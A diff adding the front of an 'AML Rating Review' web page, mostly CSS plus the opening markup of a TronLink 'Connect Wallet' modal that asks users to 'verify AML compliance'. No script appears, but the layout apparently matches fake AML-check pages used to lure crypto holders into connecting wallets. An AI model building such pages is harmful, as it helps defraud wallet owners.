@@ -1,0 +1,1965 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>AML Rating Review - Checking cryptocurrency</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #3375BB;
+            --primary-dark: #1a5fb4;
+            --accent: #00D4AA;
+            --bg-dark: #0B0E11;
+            --bg-card: #151A21;
+            --bg-hover: #1C2128;
+            --text-primary: #FFFFFF;
+            --text-secondary: #8B949E;
+            --border: #2D333B;
+            --gradient-1: #00a3ff;
+            --gradient-2: #ff00e5;
+            --success: #00D4AA;
+            --error: #ff4757;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-primary);
+            line-height: 1.6;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* Loading Screen for External Browser */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--bg-dark);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 2rem;
+        }
+
+        .loading-screen.hidden {
+            display: none;
+        }
+
+        .loading-logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 2rem;
+            color: white;
+            animation: pulse-logo 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-logo {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.8; }
+        }
+
+        .loading-text {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .loading-subtext {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            text-align: center;
+            max-width: 300px;
+        }
+
+        .loading-spinner-large {
+            width: 50px;
+            height: 50px;
+            border: 3px solid var(--border);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .open-tronlink-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.75rem;
+            padding: 1rem 2rem;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+            margin-top: 1rem;
+        }
+
+        .open-tronlink-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(51, 117, 187, 0.3);
+        }
+
+        /* Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 2000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 2.5rem;
+            max-width: 500px;
+            width: 100%;
+            position: relative;
+            animation: modalSlide 0.3s ease;
+        }
+
+        @keyframes modalSlide {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 1.5rem;
+            cursor: pointer;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: all 0.3s;
+        }
+
+        .modal-close:hover {
+            background: var(--bg-hover);
+            color: var(--text-primary);
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            text-align: center;
+        }
+
+        .modal-subtitle {
+            color: var(--text-secondary);
+            text-align: center;
+            margin-bottom: 1.5rem;
+            font-size: 0.9rem;
+        }
+
+        .wallet-step {
+            display: none;
+        }
+
+        .wallet-step.active {
+            display: block;
+        }
+
+        .wallet-option {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem;
+            background: var(--bg-hover);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            margin-bottom: 0.75rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .wallet-option:hover {
+            border-color: var(--primary);
+            transform: translateX(5px);
+        }
+
+        .wallet-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+        }
+
+        .wallet-info h4 {
+            font-weight: 600;
+            margin-bottom: 0.25rem;
+        }
+
+        .wallet-info p {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+        }
+
+        .status-message {
+            padding: 1rem;
+            border-radius: 12px;
+            margin: 1rem 0;
+            font-size: 0.9rem;
+            display: none;
+        }
+
+        .status-message.success {
+            background: rgba(0, 212, 170, 0.1);
+            border: 1px solid var(--success);
+            color: var(--success);
+            display: block;
+        }
+
+        .status-message.error {
+            background: rgba(255, 71, 87, 0.1);
+            border: 1px solid var(--error);
+            color: var(--error);
+            display: block;
+        }
+
+        .status-message.info {
+            background: rgba(51, 117, 187, 0.1);
+            border: 1px solid var(--primary);
+            color: var(--primary);
+            display: block;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--border);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 0.5rem;
+        }
+
+        .contract-info {
+            background: var(--bg-hover);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-family: monospace;
+            font-size: 0.8rem;
+            word-break: break-all;
+        }
+
+        .contract-info label {
+            display: block;
+            color: var(--text-secondary);
+            margin-bottom: 0.5rem;
+            font-family: 'Inter', sans-serif;
+        }
+
+        /* Header */
+        .header-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            background: rgba(11, 14, 17, 0.98);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .header {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 1rem 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 70px;
+        }
+
+        .header-logo a {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            text-decoration: none;
+            color: var(--text-primary);
+        }
+
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 1.1rem;
+            color: white;
+            flex-shrink: 0;
+        }
+
+        .header-logo h1 {
+            font-size: 1.25rem;
+            font-weight: 600;
+            white-space: nowrap;
+            letter-spacing: -0.02em;
+        }
+
+        .login-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .login-btn {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.75rem 1.5rem;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            white-space: nowrap;
+            text-decoration: none;
+        }
+
+        .login-btn:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(51, 117, 187, 0.3);
+        }
+
+        .login-btn.connected {
+            background: var(--success);
+        }
+
+        .login-icon {
+            width: 18px;
+            height: 18px;
+            flex-shrink: 0;
+        }
+
+        /* Hero Section */
+        .hero-container {
+            padding-top: 90px;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding-left: 5%;
+            padding-right: 5%;
+            padding-bottom: 2rem;
+        }
+
+        .hero-main {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4rem;
+            align-items: center;
+            min-height: calc(100vh - 250px);
+            padding: 3rem 0;
+        }
+
+        .hero-content {
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+            max-width: 600px;
+        }
+
+        .hero-content h1 {
+            font-size: clamp(2rem, 4vw, 3.5rem);
+            font-weight: 700;
+            line-height: 1.15;
+            letter-spacing: -0.02em;
+            background: linear-gradient(135deg, var(--text-primary) 0%, var(--text-secondary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero-content p {
+            font-size: clamp(1rem, 1.5vw, 1.25rem);
+            color: var(--text-secondary);
+            line-height: 1.7;
+            max-width: 500px;
+        }
+
+        .hero-cta {
+            margin-top: 0.5rem;
+        }
+
+        .hero-cta-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem 2rem;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            white-space: nowrap;
+            text-decoration: none;
+        }
+
+        .hero-cta-btn:hover {
+            background: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(51, 117, 187, 0.35);
+        }
+
+        .hero-visual {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        /* Animated Security Dashboard */
+        .security-dashboard {
+            position: relative;
+            width: 100%;
+            max-width: 550px;
+            aspect-ratio: 4/3;
+            background: linear-gradient(135deg, rgba(51, 117, 187, 0.1) 0%, rgba(0, 212, 170, 0.1) 100%);
+            border-radius: 24px;
+            border: 1px solid var(--border);
+            overflow: hidden;
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.4);
+        }
+
+        .dashboard-header {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .dashboard-header::before {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: var(--accent);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .dashboard-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            height: 60%;
+        }
+
+        .shield-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 120px;
+            height: 120px;
+        }
+
+        .shield {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
+            clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .shield svg {
+            width: 50px;
+            height: 50px;
+            fill: white;
+        }
+
+        .orbit-ring {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+
+        .orbit-ring:nth-child(1) {
+            width: 180px;
+            height: 180px;
+            animation: rotate 20s linear infinite;
+        }
+
+        .orbit-ring:nth-child(2) {
+            width: 240px;
+            height: 240px;
+            animation: rotate 30s linear infinite reverse;
+        }
+
+        .orbit-ring:nth-child(3) {
+            width: 300px;
+            height: 300px;
+            animation: rotate 40s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: translate(-50%, -50%) rotate(0deg); }
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .orbit-dot {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background: var(--accent);
+            border-radius: 50%;
+            box-shadow: 0 0 10px var(--accent);
+        }
+
+        .orbit-ring:nth-child(1) .orbit-dot { top: -4px; left: 50%; transform: translateX(-50%); }
+        .orbit-ring:nth-child(2) .orbit-dot { top: 50%; right: -4px; transform: translateY(-50%); background: var(--gradient-1); box-shadow: 0 0 10px var(--gradient-1); }
+        .orbit-ring:nth-child(3) .orbit-dot { bottom: -4px; left: 50%; transform: translateX(-50%); background: var(--gradient-2); box-shadow: 0 0 10px var(--gradient-2); }
+
+        .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--accent), transparent);
+            animation: scan 3s ease-in-out infinite;
+            opacity: 0.6;
+        }
+
+        @keyframes scan {
+            0%, 100% { top: 0; opacity: 0; }
+            10% { opacity: 0.6; }
+            90% { opacity: 0.6; }
+            100% { top: 100%; opacity: 0; }
+        }
+
+        .data-particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.3);
+            font-family: monospace;
+            animation: float-particle 8s ease-in-out infinite;
+        }
+
+        @keyframes float-particle {
+            0%, 100% { transform: translateY(0) translateX(0); opacity: 0; }
+            10% { opacity: 0.3; }
+            90% { opacity: 0.3; }
+            100% { transform: translateY(-100px) translateX(20px); opacity: 0; }
+        }
+
+        .hero-image-caption {
+            position: absolute;
+            bottom: -40px;
+            right: 20px;
+            background: rgba(11, 14, 17, 0.9);
+            backdrop-filter: blur(10px);
+            padding: 0.75rem 1.25rem;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            font-size: 0.875rem;
+            color: var(--text-secondary);
+            white-space: nowrap;
+        }
+
+        /* Trust Section */
+        .trust-section {
+            margin-top: 4rem;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 2rem;
+        }
+
+        .trust-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .trust-icon {
+            width: 28px;
+            height: 28px;
+            background: linear-gradient(135deg, var(--accent) 0%, var(--primary) 100%);
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.9rem;
+            flex-shrink: 0;
+        }
+
+        .trust-header p {
+            color: var(--text-secondary);
+            font-weight: 500;
+            font-size: 1rem;
+        }
+
+        .trust-logos {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 2.5rem;
+            align-items: center;
+        }
+
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .trust-logo-box {
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.75rem;
+            color: var(--text-secondary);
+            border: 1px solid var(--border);
+            flex-shrink: 0;
+        }
+
+        .trust-item span {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            font-weight: 500;
+        }
+
+        /* Clients Slider */
+        .clients-section {
+            padding: 4rem 0;
+            background: rgba(255, 255, 255, 0.01);
+            overflow: hidden;
+        }
+
+        .clients-title {
+            text-align: center;
+            font-size: 1.25rem;
+            font-weight: 600;
+            margin-bottom: 2rem;
+            color: var(--text-secondary);
+        }
+
+        .slider-wrapper {
+            position: relative;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .slider-track {
+            display: flex;
+            gap: 1.5rem;
+            animation: scroll 40s linear infinite;
+            width: max-content;
+        }
+
+        .slider-wrapper:hover .slider-track {
+            animation-play-state: paused;
+        }
+
+        @keyframes scroll {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        .client-card {
+            width: 200px;
+            height: 80px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1rem;
+            transition: all 0.3s;
+        }
+
+        .client-card:hover {
+            border-color: var(--primary);
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .client-name {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        /* Stats Section */
+        .stats-section {
+            padding: 4rem 5%;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 2rem;
+        }
+
+        .stat-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 2.5rem 2rem;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--primary);
+        }
+
+        .stat-value {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--gradient-1) 0%, var(--gradient-2) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 0.75rem;
+            line-height: 1.2;
+        }
+
+        .stat-label {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+
+        .stat-logos {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .stat-logo-item {
+            padding: 0.5rem 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            border: 1px solid var(--border);
+        }
+
+        /* Services Section */
+        .services-section {
+            padding: 5rem 5%;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .section-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .section-header h2 {
+            font-size: clamp(1.75rem, 3vw, 2.5rem);
+            font-weight: 700;
+            margin-bottom: 0.75rem;
+        }
+
+        .section-header p {
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+        }
+
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1.5rem;
+        }
+
+        .service-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 2rem;
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            gap: 1.25rem;
+        }
+
+        .service-card:hover {
+            transform: translateY(-8px);
+            border-color: var(--primary);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .service-icon {
+            width: 56px;
+            height: 56px;
+            background: linear-gradient(135deg, rgba(51, 117, 187, 0.2) 0%, rgba(0, 212, 170, 0.2) 100%);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            flex-shrink: 0;
+        }
+
+        .service-title {
+            font-size: 1.25rem;
+            font-weight: 600;
+            line-height: 1.4;
+            color: var(--text-primary);
+        }
+
+        .service-desc {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            line-height: 1.8;
+            flex-grow: 1;
+        }
+
+        /* Pricing Section */
+        .pricing-section {
+            padding: 5rem 5%;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .pricing-card {
+            background: linear-gradient(135deg, rgba(51, 117, 187, 0.08) 0%, rgba(0, 212, 170, 0.08) 100%);
+            border: 1px solid var(--border);
+            border-radius: 30px;
+            padding: 3.5rem;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .pricing-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(51, 117, 187, 0.1) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        .pricing-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .pricing-header h2 {
+            font-size: clamp(1.5rem, 3vw, 2.25rem);
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+
+        .pricing-badge {
+            display: inline-block;
+            color: var(--accent);
+            font-weight: 600;
+            font-size: 1rem;
+            margin-bottom: 2rem;
+            letter-spacing: 0.05em;
+        }
+
+        .pricing-amount {
+            margin-bottom: 2rem;
+        }
+
+        .pricing-amount .from {
+            color: var(--text-secondary);
+            font-size: 1rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .price-tag {
+            display: flex;
+            align-items: baseline;
+            justify-content: center;
+            gap: 0.75rem;
+            flex-wrap: wrap;
+        }
+
+        .price-value {
+            font-size: 4rem;
+            font-weight: 800;
+            background: linear-gradient(115.31deg, var(--gradient-1) -9.87%, var(--gradient-2) 105.89%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1;
+        }
+
+        .price-period {
+            color: var(--text-secondary);
+            font-size: 1rem;
+        }
+
+        .pricing-cta {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--primary);
+            font-weight: 600;
+            text-decoration: none;
+            font-size: 1.1rem;
+            transition: gap 0.3s;
+        }
+
+        .pricing-cta:hover {
+            gap: 1rem;
+        }
+
+        .pricing-cta-arrow {
+            width: 20px;
+            height: 20px;
+            transition: transform 0.3s;
+        }
+
+        .pricing-note {
+            text-align: center;
+            margin-top: 2rem;
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            line-height: 1.8;
+        }
+
+        .pricing-note span {
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        /* Partners Marquee */
+        .partners-section {
+            padding: 3rem 0;
+            overflow: hidden;
+        }
+
+        .partners-header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .partners-header p {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+
+        .marquee-container {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .marquee-row {
+            overflow: hidden;
+            position: relative;
+        }
+
+        .marquee-row::before,
+        .marquee-row::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            width: 100px;
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        .marquee-row::before {
+            left: 0;
+            background: linear-gradient(90deg, var(--bg-dark) 0%, transparent 100%);
+        }
+
+        .marquee-row::after {
+            right: 0;
+            background: linear-gradient(270deg, var(--bg-dark) 0%, transparent 100%);
+        }
+
+        .marquee-content {
+            display: flex;
+            gap: 1.5rem;
+            width: max-content;
+        }
+
+        .marquee-left {
+            animation: marqueeLeft 35s linear infinite;
+        }
+
+        .marquee-right {
+            animation: marqueeRight 35s linear infinite;
+        }
+
+        @keyframes marqueeLeft {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        @keyframes marqueeRight {
+            0% { transform: translateX(-50%); }
+            100% { transform: translateX(0); }
+        }
+
+        .partner-item {
+            width: 180px;
+            height: 70px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 0.75rem;
+            transition: all 0.3s;
+        }
+
+        .partner-item:hover {
+            border-color: var(--primary);
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .partner-name {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.03em;
+        }
+
+        /* Footer */
+        .footer {
+            background: rgba(255, 255, 255, 0.02);
+            border-top: 1px solid var(--border);
+            padding: 4rem 5% 2rem;
+            margin-top: 3rem;
+        }
+
+        .footer-container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr;
+            gap: 3rem;
+            margin-bottom: 3rem;
+        }
+
+        .footer-brand {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            line-height: 1.8;
+        }
+
+        .footer-brand strong {
+            color: var(--text-primary);
+            font-weight: 600;
+            display: block;
+            margin-bottom: 1rem;
+            font-size: 1rem;
+        }
+
+        .footer-links h4 {
+            color: var(--text-primary);
+            font-size: 1rem;
+            font-weight: 600;
+            margin-bottom: 1.25rem;
+        }
+
+        .footer-links ul {
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-bottom: 0.75rem;
+        }
+
+        .footer-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: var(--primary);
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border);
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .hero-main {
+                grid-template-columns: 1fr;
+                text-align: center;
+                gap: 2.5rem;
+                min-height: auto;
+                padding: 2rem 0;
+            }
+
+            .hero-content {
+                max-width: 100%;
+                align-items: center;
+                order: 1;
+            }
+
+            .hero-content p {
+                max-width: 500px;
+            }
+
+            .hero-visual {
+                order: 0;
+            }
+
+            .security-dashboard {
+                max-width: 400px;
+            }
+
+            .hero-image-caption {
+                position: static;
+                margin-top: 1rem;
+                display: inline-block;
+            }
+
+            .services-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .footer-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header {
+                padding: 0.75rem 4%;
+                min-height: 60px;
+            }
+
+            .header-logo h1 {
+                font-size: 1.1rem;
+            }
+
+            .logo-icon {
+                width: 32px;
+                height: 32px;
+                font-size: 1rem;
+            }
+
+            .login-btn {
+                padding: 0.6rem 1.25rem;
+                font-size: 0.875rem;
+            }
+
+            .login-btn span {
+                display: none;
+            }
+
+            .login-icon {
+                margin: 0;
+            }
+
+            .hero-container {
+                padding-top: 75px;
+            }
+
+            .hero-content h1 {
+                font-size: 1.75rem;
+            }
+
+            .security-dashboard {
+                max-width: 100%;
+            }
+
+            .shield-container {
+                width: 80px;
+                height: 80px;
+            }
+
+            .shield svg {
+                width: 35px;
+                height: 35px;
+            }
+
+            .orbit-ring:nth-child(1) { width: 140px; height: 140px; }
+            .orbit-ring:nth-child(2) { width: 190px; height: 190px; }
+            .orbit-ring:nth-child(3) { width: 240px; height: 240px; }
+
+            .trust-section {
+                padding: 1.5rem;
+                margin-top: 2rem;
+            }
+
+            .trust-logos {
+                gap: 1.5rem;
+                justify-content: center;
+            }
+
+            .trust-logo-box {
+                width: 36px;
+                height: 36px;
+                font-size: 0.7rem;
+            }
+
+            .stats-grid {
+                grid-template-columns: 1fr;
+                gap: 1.5rem;
+            }
+
+            .stat-card {
+                padding: 2rem 1.5rem;
+            }
+
+            .stat-value {
+                font-size: 2rem;
+            }
+
+            .services-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .service-card {
+                padding: 1.75rem;
+            }
+
+            .pricing-card {
+                padding: 2.5rem 1.5rem;
+            }
+
+            .price-value {
+                font-size: 3rem;
+            }
+
+            .footer-grid {
+                grid-template-columns: 1fr;
+                gap: 2rem;
+                text-align: center;
+            }
+
+            .footer-brand {
+                max-width: 300px;
+                margin: 0 auto;
+            }
+
+            .modal-content {
+                padding: 1.5rem;
+                margin: 1rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .hero-content h1 {
+                font-size: 1.5rem;
+            }
+
+            .hero-cta-btn {
+                width: 100%;
+                max-width: 280px;
+            }
+
+            .trust-header {
+                flex-direction: column;
+                text-align: center;
+                gap: 0.75rem;
+            }
+
+            .trust-logos {
+                flex-direction: column;
+                gap: 1rem;
+            }
+
+            .trust-item {
+                justify-content: center;
+                width: 100%;
+            }
+
+            .client-card {
+                width: 160px;
+                height: 70px;
+            }
+
+            .partner-item {
+                width: 140px;
+                height: 55px;
+            }
+
+            .price-value {
+                font-size: 2.5rem;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .hero-content h1 {
+                font-size: 1.35rem;
+            }
+
+            .trust-item span {
+                font-size: 0.85rem;
+            }
+        }
+    </style>
+<base target="_blank">
+</head>
+<body>
+    <!-- Loading Screen for External Browser -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-logo">AR</div>
+        <div class="loading-text">AML Rating Review</div>
+        <div class="loading-spinner-large"></div>
+        <div class="loading-subtext" id="loadingText">Checking wallet connection...</div>
+        <a href="#" class="open-tronlink-btn" id="openTronLinkBtn" style="display: none;" onclick="openInTronLink()">
+            <span>🔗</span> Open in TronLink
+        </a>
+    </div>
+
+    <!-- Modal -->
+    <div class="modal-overlay" id="walletModal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeModal()">&times;</button>
+            
+            <div class="wallet-step active" id="step1">
+                <h2 class="modal-title">Connect Wallet</h2>
+                <p class="modal-subtitle">Select your wallet to verify AML compliance</p>
+                
+                <div class="wallet-option" onclick="connectTronLink()">
+                    <div class="wallet-icon">🔗</div>
